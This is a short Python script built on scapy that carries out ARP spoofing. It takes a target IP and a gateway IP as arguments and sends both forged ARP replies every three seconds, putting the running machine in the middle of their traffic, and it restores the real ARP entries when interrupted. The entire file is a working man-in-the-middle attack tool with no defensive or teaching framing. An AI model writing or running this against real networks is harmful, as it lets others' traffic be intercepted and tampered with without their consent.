import scapy.all as scapy
import time
import argparse


def posion(target_ip, poisoned_ip):
    target_mac = arp_request(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def posion_reset(fooled_ip, gateway_ip):
    fooled_mac = arp_request(fooled_ip)
    gateway_mac = arp_request(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False)


def arp_request(ip):
    arp_requestt = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_requestt
    answered = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


number = 0


def user_inputs():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-t", "--target_ip", dest="target_ip", help="enter the ip who will be effected")
    arg_parser.add_argument("-g", "--gateway_ip", dest="gateway_ip", help="enter the ip who gateway ip")
    user_options = arg_parser.parse_args()
    if not user_options.target_ip:
        print("enter the ip target")
    if not user_options.gateway_ip:
        print("enter the ip gateway")
    return user_options


user_ips = user_inputs()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip
try:
    while True:
        posion(user_target_ip, user_gateway_ip)
        posion(user_gateway_ip, user_target_ip)
        number += 2
        print("\rsending packets " + str(number), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n\nExiting")
    posion_reset(user_target_ip, user_gateway_ip)
    posion_reset(user_gateway_ip, user_target_ip)
